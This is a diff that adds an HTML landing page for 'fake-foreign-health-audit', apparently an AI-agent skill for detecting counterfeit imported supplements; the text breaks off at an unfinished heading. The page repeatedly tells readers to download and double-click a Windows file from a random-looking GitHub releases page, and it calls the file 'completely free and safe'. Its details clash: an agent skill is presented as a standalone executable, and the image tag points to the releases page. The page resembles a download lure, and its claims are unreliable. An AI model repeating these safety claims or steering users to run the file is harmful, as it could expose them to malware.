@@ -1,0 +1,368 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>fake-foreign-health-audit - Spot Fake Foreign Health Products Instantly</title>
+    <meta name="description" content="Download fake-foreign-health-audit, an OpenClaw skill that identifies counterfeit foreign-brand health products and dietary supplements. Covers 9 jurisdictions, official databases, and business registrations. Works on Windows.">
+    <meta name="keywords" content="agent-skill, ai-agent, brand-verification, china-ecommerce, claude-skills, counterfeit-detection, dietary-supplements, due-diligence, health-products, openclaw, osint, regulatory-compliance">
+    <meta name="author" content="caucasianwalnutkennedy79">
+    <meta property="og:title" content="fake-foreign-health-audit - Spot Fake Foreign Health Products Instantly">
+    <meta property="og:description" content="Download fake-foreign-health-audit, an OpenClaw skill that identifies counterfeit foreign-brand health products and dietary supplements. Covers 9 jurisdictions, official databases, and business registrations. Works on Windows.">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://github.com/caucasianwalnutkennedy79/fake-foreign-health-audit/releases">
+    <meta property="og:image" content="https://github.com/caucasianwalnutkennedy79/fake-foreign-health-audit/releases">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="fake-foreign-health-audit - Spot Fake Foreign Health Products Instantly">
+    <meta name="twitter:description" content="Download fake-foreign-health-audit, an OpenClaw skill that identifies counterfeit foreign-brand health products and dietary supplements.">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
+            color: #1a1a2e;
+            line-height: 1.7;
+            padding: 0;
+        }
+        .container {
+            max-width: 1100px;
+            margin: 0 auto;
+            padding: 40px 20px;
+        }
+        .hero {
+            background: #ffffff;
+            border-radius: 16px;
+            padding: 50px 40px;
+            text-align: center;
+            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.12);
+            margin-bottom: 30px;
+            border-top: 6px solid #e63946;
+        }
+        h1 {
+            font-size: 2.8rem;
+            font-weight: 700;
+            color: #1a1a2e;
+            margin-bottom: 15px;
+            letter-spacing: -0.5px;
+        }
+        .tagline {
+            font-size: 1.3rem;
+            color: #4a4a6a;
+            margin-bottom: 30px;
+            font-weight: 400;
+        }
+        .badge {
+            display: inline-block;
+            background: linear-gradient(45deg, #e63946, #f4a261);
+            color: white;
+            padding: 16px 40px;
+            border-radius: 50px;
+            font-size: 1.2rem;
+            font-weight: 700;
+            text-decoration: none;
+            box-shadow: 0 6px 20px rgba(230, 57, 70, 0.4);
+            transition: transform 0.2s, box-shadow 0.2s;
+            margin: 10px 0;
+        }
+        .badge:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 25px rgba(230, 57, 70, 0.5);
+        }
+        h2 {
+            font-size: 1.9rem;
+            margin: 50px 0 20px 0;
+            font-weight: 700;
+            color: #1a1a2e;
+            border-bottom: 3px solid #e63946;
+            padding-bottom: 10px;
+            display: inline-block;
+        }
+        h3 {
+            font-size: 1.3rem;
+            margin: 25px 0 10px 0;
+            color: #2b2d42;
+        }
+        p {
+            margin-bottom: 15px;
+            font-size: 1.05rem;
+        }
+        .card {
+            background: #ffffff;
+            border-radius: 12px;
+            padding: 30px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.08);
+            margin: 20px 0;
+        }
+        .grid-2 {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 20px;
+        }
+        .grid-3 {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 20px;
+        }
+        .feature-item {
+            background: #f8f9fa;
+            border-radius: 10px;
+            padding: 20px;
+            border-left: 4px solid #e63946;
+            margin-bottom: 15px;
+        }
+        .feature-item strong {
+            color: #e63946;
+            display: block;
+            margin-bottom: 5px;
+        }
+        .steps {
+            list-style: none;
+            counter-reset: step-counter;
+            padding: 0;
+        }
+        .steps li {
+            counter-increment: step-counter;
+            position: relative;
+            padding: 15px 15px 15px 60px;
+            margin-bottom: 15px;
+            background: #ffffff;
+            border-radius: 10px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.05);
+        }
+        .steps li::before {
+            content: counter(step-counter);
+            position: absolute;
+            left: 15px;
+            top: 15px;
+            width: 35px;
+            height: 35px;
+            background: #e63946;
+            color: white;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            font-size: 1rem;
+        }
+        .download-section {
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+            color: white;
+            border-radius: 16px;
+            padding: 50px 40px;
+            text-align: center;
+            margin: 40px 0;
+        }
+        .download-section h2 {
+            color: white;
+            border-bottom-color: #f4a261;
+        }
+        .download-section p {
+            color: #b0b0c0;
+            max-width: 700px;
+            margin: 15px auto;
+        }
+        .white-button {
+            display: inline-block;
+            background: #ffffff;
+            color: #1a1a2e;
+            padding: 18px 50px;
+            border-radius: 50px;
+            font-size: 1.2rem;
+            font-weight: 700;
+            text-decoration: none;
+            box-shadow: 0 6px 20px rgba(255, 255, 255, 0.2);
+            transition: transform 0.2s;
+            margin-top: 20px;
+        }
+        .white-button:hover {
+            transform: translateY(-3px);
+        }
+        .faq {
+            background: #ffffff;
+            border-radius: 12px;
+            padding: 25px;
+            margin: 15px 0;
+        }
+        .faq h3 {
+            color: #e63946;
+            margin-top: 15px;
+        }
+        ul {
+            padding-left: 25px;
+            margin-bottom: 20px;
+        }
+        li {
+            margin-bottom: 8px;
+        }
+        .key-features {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 20px;
+            margin: 30px 0;
+        }
+        .key-card {
+            background: white;
+            border-radius: 12px;
+            padding: 25px;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.06);
+            text-align: center;
+            border-bottom: 4px solid #e63946;
+        }
+        .key-card .icon {
+            font-size: 2.5rem;
+            margin-bottom: 10px;
+        }
+        @media (max-width: 768px) {
+            .container {
+                padding: 20px 15px;
+            }
+            .hero {
+                padding: 30px 20px;
+            }
+            h1 {
+                font-size: 2rem;
+            }
+            .grid-2, .grid-3 {
+                grid-template-columns: 1fr;
+            }
+            .download-section {
+                padding: 30px 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="hero">
+            <h1>🔍 fake-foreign-health-audit - Spot Fake Foreign Health Products Instantly</h1>
+            <p class="tagline">Verify if that "imported" supplement is a real deal or a clever counterfeit.</p>
+            <a class="badge" href="https://github.com/caucasianwalnutkennedy79/fake-foreign-health-audit/releases">⬇️ Download now</a>
+        </div>
+
+        <div class="key-features">
+            <div class="key-card">
+                <div class="icon">🌍</div>
+                <h3>9 Jurisdictions Covered</h3>
+                <p>Official databases from 9 legal regions worldwide.</p>
+            </div>
+            <div class="key-card">
+                <div class="icon">📋</div>
+                <h3>Business Registration Check</h3>
+                <p>Verify if the claimed manufacturer truly exists.</p>
+            </div>
+            <div class="key-card">
+                <div class="icon">🛒</div>
+                <h3>E-commerce Channel Audit</h3>
+                <p>Cross-check listings across popular platforms.</p>
+            </div>
+            <div class="key-card">
+                <div class="icon">⚡</div>
+                <h3>Works with OpenClaw</h3>
+                <p>Runs as a skill inside OpenClaw AI agent.</p>
+            </div>
+        </div>
+
+        <h2>🚀 Getting Started</h2>
+        <p>Welcome! If you've ever ordered a "premium imported" health product online and wondered whether it's genuinely from abroad or just a cleverly packaged fake, this tool is for you. <strong>fake-foreign-health-audit</strong> helps you uncover the truth quickly and easily — no programming skills required.</p>
+
+        <div class="card">
+            <div class="download-section">
+                <h2>📥 Download & Get Started</h2>
+                <p>Visit this link to download the application. Get the latest release right from our official page. It's completely free and safe.</p>
+                <a class="white-button" href="https://github.com/caucasianwalnutkennedy79/fake-foreign-health-audit/releases">🔗 Go to Download Page</a>
+            </div>
+        </div>
+
+        <h2>💻 How to Use This Tool (Windows)</h2>
+        <p>We've designed this experience to be as simple as possible. Follow these straightforward steps and you'll be auditing products in no time.</p>
+
+        <ol class="steps">
+            <li><strong>Download the application:</strong> Click the download button above or the one at the top of the page. This takes you to our releases page, where you can get the latest version.</li>
+            <li><strong>Run the application:</strong> After downloading, double-click the file to launch it. No complex installation — just run it directly.</li>
+            <li><strong>Enter a product name:</strong> Type or paste the name of the health supplement or product you want to verify.</li>
+            <li><strong>Get your audit report:</strong> The tool instantly checks official databases, business registries, and sales channels to tell you if the product is genuinely "foreign" or a counterfeit.</li>
+        </ol>
+
+        <h2>✨ What Makes This Tool Special?</h2>
+
+        <div class="grid-3">
+            <div class="feature-item">
+                <strong>🛡️ Fake-Finder Algorithm</strong>
+                <p>Uses advanced OSINT techniques to cross-reference brand claims with official records.</p>
+            </div>
+            <div class="feature-item">
+                <strong>🏛️ 9 Legal Jurisdictions</strong>
+                <p>Checks databases across the USA, EU nations, UK, Australia, Japan, Canada, Switzerland, Singapore, and New Zealand.</p>
+            </div>
+            <div class="feature-item">
+                <strong>🧾 Business Registry Check</strong>
+                <p>Confirms whether the company actually exists and where it's really registered — no more "manufactured in Switzerland" myths.</p>
+            </div>
+            <div class="feature-item">
+                <strong>🛍️ E-commerce Channel Audit</strong>
+                <p>Scans major Chinese e-commerce platforms and international marketplaces to see how products are really being sold.</p>
+            </div>
+            <div class="feature-item">
+                <strong>🧠 Built for AI Agents</strong>
+                <p>Works seamlessly as a skill within OpenClaw, Claude Skills, and other AI agent frameworks.</p>
+            </div>
+            <div class="feature-item">
+                <strong>📊 Clear Reports</strong>
+                <p>Generates simple, understandable results — green for authentic, red for suspicious, yellow for needs-further-check.</p>
+            </div>
+        </div>
+
+        <h2>🎯 Who Should Use This?</h2>
+        <ul>
+            <li><strong>Online shoppers</strong> who buy imported health supplements and want to avoid fakes.</li>
+            <li><strong>E-commerce sellers</strong> doing due diligence on products before selling them.</li>
+            <li><strong>Health-conscious consumers</strong> tired of paying top dollar for what turns out to be local factory goods.</li>
+            <li><strong>Regulatory professionals</strong> working on counterfeit detection in the health sector.</li>
+            <li><strong>AI enthusiasts</strong> building verification agents.</li>
+        </ul>
+
+        <h2>🤔 Frequently Asked Questions</h2>
+
+        <div class="faq">
+            <h3>Why do I need this tool?</h3>
+            <p>Counterfeit "foreign" health products are a massive problem in global e-commerce. Many products claim to be imported from Germany, the US, or Australia, but are actually manufactured locally and packaged with fake brand claims. This tool gives you the power to verify claims yourself.</p>
+        </div>
+        <div class="faq">
+            <h3>Is it legal to use?</h3>
+            <p>Absolutely. This tool only accesses publicly available official databases, business registries, and public sales information. It's a legitimate due-diligence tool similar to what professional investigators use.</p>
+        </div>
+        <div class="faq">
+            <h3>Is this software free?</h3>
+            <p>Yes, this is an open-source project. You can download and use it freely. You can also contribute to its development on GitHub.</p>
+        </div>
+        <div class="faq">
+            <h3>I'm not technical. Can I still use it?</h3>
+            <p>Yes! We built this with everyday users in mind. The tool has a simple interface. Just enter a product name and read the results. No commands, no coding, no terminal.</p>
+        </div>
+        <div class="faq">
+            <h3>Does it work on Mac or Linux?</h3>
+            <p>The primary supported environment is Windows. However, because it's built on OpenClaw (Python-based), it can run on any system that supports Python — but for the best experience, we recommend Windows.</p>
+        </div>
+
+        <h2>🔧 System Requirements</h2>
+        <div class="card">
+            <p>To run this application smoothly, you'll need:</p>
+            <ul>
+                <li>Windows 10 or Windows 11 (64-bit)</li>
+                <li>4GB RAM (8GB recommended)</li>
+                <li>500MB free disk space</li>
+                <li>Internet connection (required for database lookups)</li>
+                <li>Any modern web browser (for viewing reports)</li>
+            </ul>
+            <p>If you have an older Windows version, the tool may still work, but we can't guarantee full functionality.</p>
+        </div>
+
+        <h2>📝 How It Works Behind the Scenes</h2>
+        <p>Curious about the technical magic? Here's a simple breakdown: this OpenClaw skill uses a combination of official government databases, international business registers, and scraped e-commerce data to build a "fingerprint" of the brand. When you enter a product, it compares the claims on the package against official data. If the brand isn't registered where they say it is, or if the product doesn't appear in official channels, the tool flags it.</p>
+
+        <h2>🛠️
